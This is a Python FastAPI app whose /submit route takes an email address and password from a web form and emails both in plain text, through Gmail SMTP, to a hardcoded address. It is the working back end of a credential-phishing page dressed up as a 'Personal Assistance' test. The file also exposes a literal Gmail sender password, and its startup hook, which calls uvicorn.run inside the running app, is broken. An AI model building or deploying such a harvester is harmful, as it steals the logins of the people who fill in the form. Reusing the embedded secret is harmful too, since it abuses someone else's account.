from fastapi import FastAPI, Request, Form
from fastapi.templating import Jinja2Templates
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import uvicorn

app = FastAPI()
templates = Jinja2Templates(directory="templates")


def send_email(sender_email, sender_password, recipient_email, subject, body):
    # SMTP server settings for Gmail
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    # Create a secure SSL context
    context = ssl.create_default_context()

    # Connect to the SMTP server
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls(context=context)
        server.login(sender_email, sender_password)

        # Create a multipart message
        message = MIMEMultipart("alternative")
        message["Subject"] = subject
        message["From"] = sender_email
        message["To"] = recipient_email

        # Attach the HTML content to the email
        html_content = body
        part = MIMEText(html_content, "html")
        message.attach(part)

        # Send the email
        server.sendmail(sender_email, recipient_email, message.as_string())


@app.get("/")
def read_root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.post("/submit")
async def submit_form(request: Request, email: str = Form(...), password: str = Form(...)):
    sender_email = "orzilber0@gmail.com"
    sender_password = "nbcecsflnpfqaust"
    recipient_email = "orzilber0@gmail.com"

    subject = "Personal Assistance Email Test"
    body = f"Email: {email}\nPassword: {password}"

    send_email(sender_email, sender_password, recipient_email, subject, body)

    return templates.TemplateResponse("success.html", {"request": request})


# Run the application using FastAPI's on_event decorator
@app.on_event("startup")
async def startup_event():
    # Check if running on Heroku
    if "DYNO" in os.environ:
        # If running on Heroku, use the provided port
        port = int(os.environ.get("PORT", 8000))
        uvicorn.run(app, host="0.0.0.0", port=port)
    else:
        # If running locally, use default settings
        uvicorn.run(app, host="localhost", port=8000, reload=True)
